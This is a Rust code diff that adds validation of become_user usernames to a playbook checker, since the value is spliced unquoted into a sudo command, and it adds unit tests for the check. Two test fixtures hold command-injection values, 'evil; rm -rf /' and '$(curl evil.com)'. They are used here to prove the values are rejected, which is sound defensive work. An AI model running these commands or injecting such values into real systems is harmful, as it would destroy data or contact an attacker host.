@@ -32,6 +32,15 @@ fn validate_play(play: &Play, idx: usize, inv: Option<&Inventory>) -> Result<()>
     if play.tasks.is_empty() {
         bail!("{}: no tasks (and no roles contributing tasks)", where_());
     }
+    if let Some(u) = &play.become_user {
+        if !is_valid_username(u) {
+            bail!(
+                "{}: become_user {:?} is not a valid POSIX username",
+                where_(),
+                u
+            );
+        }
+    }
     let names_to_check: Vec<&str> = match &play.hosts {
         HostSelector::All(_) => Vec::new(),
         HostSelector::Names(names) => {
@@ -120,6 +129,22 @@ fn validate_handler(h: &Task, where_: &str, hi: usize) -> Result<()> {
 }
 
 fn validate_task(task: &Task, where_: &str, ti: usize) -> Result<()> {
+    // become_user: when set, must be a safe identifier — the orchestrator
+    // splices it into a `sudo -n -u <user> --` argv unquoted, and an
+    // attacker-controlled value with shell metacharacters could escape
+    // the wrap. We require POSIX-ish usernames: [A-Za-z_][A-Za-z0-9_-]*
+    // up to 32 chars (the conventional Linux limit).
+    if let Some(u) = &task.become_user {
+        if !is_valid_username(u) {
+            bail!(
+                "{}: task[{ti}] {:?}: become_user {:?} is not a valid POSIX username \
+                 (allowed: [A-Za-z_][A-Za-z0-9_-]*, max 32 chars)",
+                where_,
+                task.name,
+                u
+            );
+        }
+    }
     if let Some(name) = &task.register {
         if !is_valid_identifier(name) {
             bail!(
@@ -323,6 +348,22 @@ fn validate_op(op: &TaskOp, task: &Task, where_: &str, ti: usize) -> Result<()> 
     }
 }
 
+/// POSIX-ish username: `[A-Za-z_][A-Za-z0-9_-]*`, max 32 chars
+/// (conventional Linux limit). Differs from `is_valid_identifier`
+/// in allowing `-` (common in service-account names like
+/// `postgres-replica`).
+fn is_valid_username(s: &str) -> bool {
+    if s.is_empty() || s.len() > 32 {
+        return false;
+    }
+    let mut chars = s.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
+}
+
 /// Python-ish identifier: `[A-Za-z_][A-Za-z0-9_]*`.
 fn is_valid_identifier(s: &str) -> bool {
     let mut chars = s.chars();
@@ -497,6 +538,78 @@ mod tests {
         let err = validate(&pb, None).unwrap_err();
         let msg = format!("{err:#}");
         assert!(msg.contains("meta") && msg.contains("register"), "got: {msg}");
+    }
+
+    #[test]
+    fn rejects_invalid_become_user_on_task() {
+        let pb: Playbook = serde_yaml::from_str(
+            r#"
+- name: p
+  tasks:
+    - name: t
+      become: true
+      become_user: "evil; rm -rf /"
+      shell: echo hi
+"#,
+        )
+        .unwrap();
+        let err = validate(&pb, None).unwrap_err();
+        let msg = format!("{err:#}");
+        assert!(
+            msg.contains("become_user") && msg.contains("POSIX"),
+            "got: {msg}"
+        );
+    }
+
+    #[test]
+    fn rejects_invalid_become_user_on_play() {
+        let pb: Playbook = serde_yaml::from_str(
+            r#"
+- name: p
+  become: true
+  become_user: "$(curl evil.com)"
+  tasks:
+    - name: t
+      shell: echo hi
+"#,
+        )
+        .unwrap();
+        let err = validate(&pb, None).unwrap_err();
+        let msg = format!("{err:#}");
+        assert!(msg.contains("become_user"), "got: {msg}");
+    }
+
+    #[test]
+    fn accepts_normal_become_users() {
+        let pb: Playbook = serde_yaml::from_str(
+            r#"
+- name: p
+  become: true
+  become_user: postgres
+  tasks:
+    - name: t
+      shell: echo hi
+    - name: u
+      become_user: www-data
+      shell: echo hi
+"#,
+        )
+        .unwrap();
+        validate(&pb, None).unwrap();
+    }
+
+    #[test]
+    fn username_validator_accepts_realistic() {
+        assert!(is_valid_username("root"));
+        assert!(is_valid_username("postgres"));
+        assert!(is_valid_username("www-data"));
+        assert!(is_valid_username("_systemd-resolve"));
+        assert!(is_valid_username("u1"));
+        assert!(!is_valid_username(""));
+        assert!(!is_valid_username("1abc"), "leading digit");
+        assert!(!is_valid_username("a b"), "embedded space");
+        assert!(!is_valid_username("a;b"), "shell metachar");
+        assert!(!is_valid_username(&"a".repeat(33)), "too long");
     }
 
     #[test]
